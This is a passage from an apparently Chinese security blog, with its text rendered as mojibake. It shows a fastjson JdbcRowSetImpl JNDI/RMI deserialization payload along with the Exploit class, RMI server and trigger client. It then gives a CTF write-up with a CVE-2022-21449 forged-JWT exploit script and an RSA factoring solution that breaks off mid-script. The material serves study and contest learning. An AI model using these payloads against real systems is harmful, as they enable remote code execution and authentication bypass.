<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œå†å…¨å±€æœç´¢ä¸€ä¸‹<code>connect</code>ï¼Œå‘ç°<code>getDatabaseMetaData</code>å’Œ<code>setAutoCommit</code>æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨<code>this.connect()</code>ï¼Œä¸è¿‡è¿™è¯¥æ€ä¹ˆç”¨å°±è¦çœ‹ç”¨<code>parse</code>è¿˜æ˜¯<code>parseObject</code>è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/f355965f53514689a31278339992fc69.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/9ad8685baec44733ab56d2a2e03c93fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h6><p>pocï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;rmi://ip:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><code>Exploit</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	 <span class="keyword">try</span> &#123;</span><br><span class="line"> 		Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"> 	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"> 		e.printStackTrace();</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> 		Exploit exploit = <span class="keyword">new</span> Exploit();</span><br><span class="line"> 	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">		Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨vpså’Œmarshalsecä¼šæŠ¥é”™ï¼Œä½†æ˜¯jdkç‰ˆæœ¬ä¹Ÿæ˜¯8u112ï¼Œæ‰€ä»¥æœ€ååœ¨æœ¬åœ°è‡ªå·±å¼€JNDIæœåŠ¡ï¼Œç„¶åç”¨phpstudyå¼€ä¸€ä¸ªç«¯å£8000ï¼Œç„¶åè¿è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// æä¾›æœåŠ¡ æ³¨å†Œ å°†å¯¹è±¡ä¸å¯¹åº”çš„Nameè¿›è¡Œç»‘å®š</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>FaIth4444å¸ˆå‚…</p>
<p><a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q">https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q</a></p>
<p><a href="https://blog.csdn.net/weixin_44687621/article/details/119947891">https://blog.csdn.net/weixin_44687621/article/details/119947891</a></p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯éƒ¨åˆ†WP</title>
    <url>/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</url>
    <content><![CDATA[<h1 id="TeamGipsyæˆ˜é˜Ÿ-WRITEUP"><a href="#TeamGipsyæˆ˜é˜Ÿ-WRITEUP" class="headerlink" title="TeamGipsyæˆ˜é˜Ÿ WRITEUP"></a>TeamGipsyæˆ˜é˜Ÿ WRITEUP</h1><h2 id="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯"><a href="#ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯" class="headerlink" title="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯"></a>ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯</h2><p>æˆ˜é˜Ÿåç§°ï¼šTeamGipsy</p>
<p>æˆ˜é˜Ÿæ’åï¼š68</p>
<h2 id="äºŒã€è§£é¢˜æƒ…å†µ"><a href="#äºŒã€è§£é¢˜æƒ…å†µ" class="headerlink" title="äºŒã€è§£é¢˜æƒ…å†µ"></a>äºŒã€è§£é¢˜æƒ…å†µ</h2><p><img src="https://img-blog.csdnimg.cn/3c6fa2a5d5d14e8680253778754a0ec5.png" alt="image-20220801133145873"></p>
<h2 id="ä¸‰ã€è§£é¢˜è¿‡ç¨‹"><a href="#ä¸‰ã€è§£é¢˜è¿‡ç¨‹" class="headerlink" title="ä¸‰ã€è§£é¢˜è¿‡ç¨‹"></a>ä¸‰ã€è§£é¢˜è¿‡ç¨‹</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;we1come_t0_qwb_s6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h4><p>å¡«å†™é—®å·å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/e8db31248b1c40168688d442ae360a17.jpeg"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h4><ul>
<li><p>è€ƒç‚¹ï¼š<a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
</li>
<li><p>è¿è¡Œç¯å¢ƒ</p>
<p>java11ï¼Œä¸‹è½½fastjsonçš„jaråŒ…ï¼Œ2.0ä»¥ä¸Šçš„éƒ½æŠ¥é”™äº†ï¼Œæ‰€ä»¥é€‰äº†<a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.9/">fastjson-1.2.9</a></p>
</li>
</ul>
<p>ä½¿ç”¨çš„æ˜¯ECDSAï¼Œè™½ç„¶æ˜¯å¯†ç é¢˜ï¼Œä½†å¹¶ä¸æ˜¯å¯¹ECDSAçš„ç­¾åã€éªŒè¯ç­‰æ­¥éª¤æ“ä½œï¼Œè¿™äº›éƒ½ç”±javaå°è£…å¥½äº†</p>
<p>æ‰€ä»¥æ˜¯javaçš„é—®é¢˜</p>
<p>ç”±äºä»£ç ä¸­ä½¿ç”¨çš„æ ¼å¼æ˜¯<code>SHA384withECDSAinP1363Format</code>ï¼Œç»è¿‡æœç´¢æ˜¯<a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a>ï¼Œå‘ç°ç«Ÿç„¶æ˜¯javaæ²¡æœ‰åˆ¤æ–­$(r,s)$æ˜¯å¦ç­‰äº0ã€‚ã€‚ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/05611fb01eff4132b87cd27e592bc556.png" alt="image-20220731114449362"></p>
<p>æ­¤å¤–è¿™äº›éƒ½æ˜¯ä¸å®‰å…¨çš„</p>
<p><img src="https://img-blog.csdnimg.cn/6b983c541c0643a6b4d8069610f2d61f.png" alt="image-20220731114725609"></p>
<ul>
<li><p><a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
<p>javaæ²¡æœ‰åˆ¤æ–­$(r,s)$æ˜¯å¦ç­‰äº0ä¼šå¦‚ä½•å‘¢ï¼Ÿå…¶å®åœ¨ç­¾åçš„æ—¶å€™ä¸€èˆ¬éƒ½ä¼šç¡®ä¿$(r,s)$ä¸ä¸º0çš„ï¼Œä½†åœ¨éªŒç­¾çš„æ—¶å€™å¿½ç•¥äº†</p>
<p><img src="https://img-blog.csdnimg.cn/9e8bc038ab5d4ed4bd1a802e154834d8.png" alt="image-20220731120318947"></p>
<p>éªŒç­¾æ—¶è®¡ç®—<br>$$<br>r=x_P\notag<br>$$<br>è€Œ$P\equiv u_1G+u_2D\equiv s^{-1}zG+s^{-1}rD\equiv s^{-1}G(z+rd)\ (mod\ n)$</p>
<p>å½“ç„¶0çš„é€†å…ƒæ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†æ˜¯çœ‹çœ‹javaè¿™é‡Œæ˜¯æ€ä¹ˆæ±‚é€†å…ƒçš„</p>
<p><img src="https://img-blog.csdnimg.cn/41e002352e654d0fbec908cfbfbf9cb8.png" alt="image-20220731115417980"></p>
<p>ç›¸å½“äºè®¡ç®—$x^{n-2}$ï¼Œå¦‚æœ$x\ne0$ï¼Œé‚£ä¹ˆæ ¹æ®è´¹é©¬å°å®šç†ï¼ˆ$n$ä¸ºè´¨æ•°ï¼‰<br>$$<br>x^{n-1}\equiv x\ (mod\ n)\notag<br>$$<br>é‚£ä¹ˆ<br>$$<br>x^{n-2}\equiv x^{-1}\ (mod\ n)\notag<br>$$<br>ä¹Ÿå°±æ˜¯è¯´ä¸ºäº†ç®€åŒ–æˆ–è€…è¯´æé«˜æ•ˆç‡ï¼Œjavaä½¿ç”¨è´¹é©¬å°å®šç†æ±‚é€†å…ƒçš„ï¼Œè€Œä¸”æ²¡æœ‰åˆ¤æ–­0ï¼Œè¿™æ ·å°±é€ æˆäº†<br>$$<br>0^{n-2}\equiv 0\ (mod\ n)\notag<br>$$<br>$P\equiv 0\cdot G(z+rd)\ (mod\ n)\equiv 0\ (mod\ n)$</p>
<p>æœ€ç»ˆä½¿å¾—$r=x_P=0$éªŒè¯é€šè¿‡</p>
</li>
<li><p>attack</p>
<p>è¿™é‡Œå¦‚ä½•å®ç°å°†$r,s$éƒ½èµ‹å€¼ä¸º0ï¼Ÿçœ‹CVEçš„demoæ˜¯ç›´æ¥å–‚<code>\x00</code>çš„base64ç¼–ç ï¼Œä¸æ‡‚ä¸ºä»€ä¹ˆï¼Œè¿˜æ²¡æ·±ç©¶</p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.104.76.78&#x27;</span>, <span class="number">23334</span>)</span><br><span class="line"></span><br><span class="line">fake_sig = <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">name = <span class="string">b&#x27;4xwi11&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">token = io.recvline().decode()[:-<span class="number">1</span>]</span><br><span class="line">head, payload, _ = token.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">payload = b64decode(payload).replace(<span class="string">b&#x27;false&#x27;</span>, <span class="string">b&#x27;true&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload_x = head.encode() + <span class="string">b&#x27;.&#x27;</span> + b64encode(payload) + <span class="string">b&#x27;.&#x27;</span> + b64encode(fake_sig)</span><br><span class="line">io.sendline(payload_x)</span><br><span class="line"><span class="built_in">print</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;your token:flag&#123;cve-2022-21449_Secur1ty_0f_c0de_1mplementation&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>btwï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯jdkç‰ˆæœ¬çš„é—®é¢˜ï¼Œæˆ‘æœ¬åœ°ä¸è¡Œ</p>
<h4 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h4><p>å°±å®Œå…¨æ˜¯è¿™ç¯‡è®ºæ–‡çš„å¤ç°äº†<a href="https://eprint.iacr.org/2015/399.pdf">New attacks on RSA with Moduli N = p^rq</a>[6]</p>
<p>æ³¨æ„ç¬¬ä¸€å’Œç¬¬äºŒç§æ”»å‡»ä¸­ï¼Œç”¨CopperSmithè§£å°æ ¹å°±å¯ä»¥å¾—åˆ°ç›¸åº”çš„æœªçŸ¥æ•°</p>
<p><img src="https://img-blog.csdnimg.cn/ba522a2cc8644ae2a0fbe23904048738.png" alt="image-20220731171326864"></p>
<p><img src="https://img-blog.csdnimg.cn/eb97a77a94d14b58a7cdb4bf369fcef2.png" alt="image-20220731171300864"></p>
<p>å®Œæ•´çš„expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve m1, m2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_m1_m2</span>():</span></span><br><span class="line">    n11 = <span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">    n12 = <span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">    e11 = <span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">    e12 = <span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line">    c11 = <span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">    c12 = <span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> sub_fraction(n11, n12):</span><br><span class="line">        q11, q12 = _[<span class="number">0</span>], _[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n11 % q11 == <span class="number">0</span> <span class="keyword">and</span> q12 != <span class="number">1</span>:</span><br><span class="line">            p11 = iroot(n11 // q11, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p12 = iroot(n12 // q12, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> p11 ** <span class="number">2</span> * q11 == n11</span><br><span class="line">            <span class="keyword">assert</span> p12 ** <span class="number">2</span> * q12 == n12</span><br><span class="line">            phi1 = p11 * (p11 - <span class="number">1</span>) * (q11 - <span class="number">1</span>)</span><br><span class="line">            phi2 = p12 * (p12 - <span class="number">1</span>) * (q12 - <span class="number">1</span>)</span><br><span class="line">            d1 = invert(e11, phi1)</span><br><span class="line">            d2 = invert(e12, phi2)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">pow</span>(c11, d1, n11), <span class="built_in">pow</span>(c12, d2, n12)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_b</span>():</span></span><br><span class="line">    n2 = <span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    c2 = <span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">    m1, m2 = solve_m1_m2()</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    f = m1 * m2 * x - (m2 - m1)</span><br><span class="line">    f = f.monic()</span><br><span class="line">    root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">1000</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">    p2 = gcd(<span class="built_in">int</span>(f(root)), n2)</span><br><span class="line">    p2 = iroot(p2, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">    q2 = n2 // (p2 ** <span class="number">7</span>)</span><br><span class="line">    phi2 = p2 ** <span class="number">6</span> * (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">    d2 = invert(e2, phi2)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve flag</span></span><br><span class="line">n3 = <span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3 = <span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">c3 = <span 